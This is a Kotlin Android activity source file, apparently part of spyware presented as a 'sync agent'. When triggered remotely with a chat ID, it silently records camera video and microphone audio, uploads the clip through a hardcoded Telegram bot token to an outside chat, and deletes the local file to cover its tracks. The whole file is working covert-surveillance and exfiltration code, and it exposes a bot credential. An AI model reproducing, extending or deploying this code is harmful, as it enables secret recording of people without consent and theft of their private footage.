package com.cognitive.ai.syncagent

import android.app.Activity
import android.media.MediaRecorder
import android.os.Bundle
import android.util.Log
import java.io.DataOutputStream
import java.io.File
import java.io.FileInputStream
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class CameraVideoRecorderActivity : Activity() {

    companion object {
        private const val TAG = "VideoRecorderEngine"
    }

    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val chatId = intent.getStringExtra("chat_id") ?: return finish()
        val durationSeconds = intent.getIntExtra("duration", 10)

        thread(name = "ModernVideoRecordThread") {
            val videoFile = File(cacheDir, "vid_${System.currentTimeMillis()}.mp4")
            try {
                mediaRecorder = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                    MediaRecorder(this)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }.apply {
                    setAudioSource(MediaRecorder.AudioSource.CAMCORDER)
                    setVideoSource(MediaRecorder.VideoSource.CAMERA)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setVideoEncodingBitRate(3000000)
                    setVideoFrameRate(30)
                    setVideoSize(640, 480)
                    setOutputFile(videoFile.absolutePath)
                    prepare()
                    start()
                }
                isRecording = true

                Thread.sleep(durationSeconds * 1000L)
                stopAndReleaseRecorder()

                if (videoFile.exists() && videoFile.length() > 0) {
                    uploadVideoToTelegram(chatId, videoFile)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Video recording failure: ${e.message}", e)
                stopAndReleaseRecorder()
            } finally {
                finish()
            }
        }
    }

    private fun stopAndReleaseRecorder() {
        try {
            if (isRecording) {
                mediaRecorder?.stop()
                isRecording = false
            }
        } catch (_: Exception) {}
        try {
            mediaRecorder?.release()
            mediaRecorder = null
        } catch (_: Exception) {}
    }

    private fun uploadVideoToTelegram(chatId: String, file: File) {
        var connection: HttpURLConnection? = null
        try {
            val boundary = "Boundary_${System.currentTimeMillis()}"
            val url = URL("https://api.telegram.org/bot$botToken/sendVideo")
            connection = url.openConnection() as HttpURLConnection
            connection.doOutput = true
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            DataOutputStream(connection.outputStream).use { out ->
                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
                out.write("$chatId\r\n".toByteArray())

                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".toByteArray())
                out.write("🎥 تسجيل فيديو ميداني حقيقي صامت\r\n".toByteArray())

                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"video\"; filename=\"${file.name}\"\r\n".toByteArray())
                out.write("Content-Type: video/mp4\r\n\r\n".toByteArray())

                FileInputStream(file).use { it.copyTo(out) }
                out.write("\r\n--$boundary--\r\n".toByteArray())
            }
            connection.inputStream?.close()
        } catch (e: Exception) {
            Log.e(TAG, "Upload video error: ${e.message}", e)
        } finally {
            connection?.disconnect()
            if (file.exists()) file.delete()
        }
    }
}
